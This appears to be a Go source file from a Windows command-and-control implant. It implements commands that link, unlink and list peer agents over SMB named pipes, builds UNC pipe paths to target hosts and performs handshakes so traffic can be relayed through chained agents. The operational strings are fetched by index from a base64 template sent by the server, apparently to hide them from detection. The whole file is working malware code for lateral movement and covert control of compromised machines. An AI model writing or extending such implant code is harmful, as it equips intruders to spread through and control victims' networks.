//go:build windows
// +build windows

package main

import (
	"encoding/base64"
	"encoding/json"
	"strings"
	"time"
)


type RC struct {
	Version   int      `json:"v"`
	Type      int      `json:"t"`
	Templates []string `json:"tpl"`
	Params    []string `json:"p"`
}

// Template indices - must match server's common.go
const (
	idxLinkProtoSmb     = 120
	idxLinkUncSlashes   = 122
	idxLinkPipePath     = 123
	idxLinkLocalhost    = 124
	idxLinkLoopback     = 125
	idxLinkStatusPrefix = 127
	idxLinkPingMarker   = 128
	idxLinkQuitMarker   = 129
	idxLinkDot          = 132
	idxLinkPipe         = 348
)


type RM struct {
	tpl *RC
}

// getTpl safely retrieves a template string by index
func (c *RM) getTpl(idx int) string {
	if c.tpl != nil && c.tpl.Templates != nil && idx < len(c.tpl.Templates) {
		return c.tpl.Templates[idx]
	}
	return ""
}

func (c *RM) execute(ctx *OpCtx, args []string) OpResult {
	// Parse template from Msg.Data - required for operation
	if ctx.CurrentMsg == nil || ctx.CurrentMsg.Data == "" {
		return OpResult{
			Output:      Err(E18),
			EC:    1,
			Done: time.Now().Format(time.RFC3339),
		}
	}

	decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentMsg.Data)
	if err != nil {
		return OpResult{
			Output:      Err(E18),
			EC:    1,
			Done: time.Now().Format(time.RFC3339),
		}
	}

	c.tpl = &RC{}
	if err := json.Unmarshal(decoded, c.tpl); err != nil {
		return OpResult{
			Output:      Err(E18),
			EC:    1,
			Done: time.Now().Format(time.RFC3339),
		}
	}

	// Store template for link_manager.go to use
	if c.tpl.Templates != nil {
		SetLinkManagerTemplate(c.tpl.Templates)
	}

	if len(args) < 2 {
		return OpResult{
			Output:      Err(E1),
			EC:    1,
			Done: time.Now().Format(time.RFC3339),
		}
	}

	protocol := strings.ToLower(args[0])
	targetHost := args[1]

	switch protocol {
	case c.getTpl(idxLinkProtoSmb):
		if len(args) < 3 {
			return OpResult{
				Output:      Err(E1),
				EC:    1,
				Done: time.Now().Format(time.RFC3339),
			}
		}
		pipeName := args[2]

		// Build the full UNC pipe path
		// Handle localhost specially - use "." for local machine
		if strings.ToLower(targetHost) == c.getTpl(idxLinkLocalhost) || targetHost == c.getTpl(idxLinkLoopback) {
			targetHost = c.getTpl(idxLinkDot)
		}

		pipePath := c.getTpl(idxLinkUncSlashes) + targetHost + c.getTpl(idxLinkPipePath) + pipeName
		return c.linkSMB(pipePath)

	default:
		return OpResult{
			Output:      ErrCtx(E29, protocol),
			EC:    1,
			Done: time.Now().Format(time.RFC3339),
		}
	}
}

func (c *RM) linkSMB(pipePath string) OpResult {
	// Get the link manager
	lm := getLinkManager()

	// Attempt to link
	routingID, err := lm.link(pipePath)
	if err != nil {
		return OpResult{
			Output:      ErrCtx(E30, pipePath),
			EC:    1,
			Done: time.Now().Format(time.RFC3339),
		}
	}

	// Perform immediate handshake round-trip
	// This avoids waiting for the next poll cycle
	handshakeResult := c.performImmediateHandshake(lm, routingID)

	statusPrefix := c.getTpl(idxLinkStatusPrefix)
	return OpResult{
		Output:      statusPrefix + pipePath + c.getTpl(idxLinkPipe) + routingID + c.getTpl(idxLinkPipe) + handshakeResult,
		EC:    0,
		Done: time.Now().Format(time.RFC3339),
	}
}

// performImmediateHandshake handles the full handshake round-trip immediately
// instead of waiting for the next poll cycle
func (c *RM) performImmediateHandshake(lm *RMgr, routingID string) string {
	// Wait briefly for the SMB agent's handshake to arrive in the handshake queue
	// The handleIncomingData goroutine should receive it shortly after connection
	const handshakeWaitTimeout = 5 * time.Second
	deadline := time.Now().Add(handshakeWaitTimeout)

	var handshakeData *ROut
	for time.Now().Before(deadline) {
		// Check handshake queue for handshake data (sent via "lh" field)
		data := lm.getHandshakeData()
		if data != nil && data.RID == routingID {
			handshakeData = data
			break
		}
		// Re-queue any handshake that wasn't for us
		if data != nil {
			lm.queueHandshakeData(data)
		}
		time.Sleep(100 * time.Millisecond)
	}

	if handshakeData == nil {
		return c.getTpl(idxLinkPingMarker)
	}

	// Queue the handshake data to be sent via "lh" field on next response to parent
	lm.queueHandshakeData(handshakeData)
	return c.getTpl(idxLinkQuitMarker)
}


type DM struct{}

func (c *DM) execute(ctx *OpCtx, args []string) OpResult {
	if len(args) < 1 {
		return OpResult{
			Output:      Err(E1),
			EC:    1,
			Done: time.Now().Format(time.RFC3339),
		}
	}

	routingID := args[0]
	lm := getLinkManager()

	if err := lm.unlink(routingID); err != nil {
		return OpResult{
			Output:      ErrCtx(E31, routingID),
			EC:    1,
			Done: time.Now().Format(time.RFC3339),
		}
	}

	return OpResult{
		Output:      SuccCtx(S7, routingID),
		EC:    0,
		Done: time.Now().Format(time.RFC3339),
	}
}


type RLM struct{}

func (c *RLM) execute(ctx *OpCtx, args []string) OpResult {
	lm := getLinkManager()
	output := lm.listLinks()

	return OpResult{
		Output:      output,
		EC:    0,
		Done: time.Now().Format(time.RFC3339),
	}
}
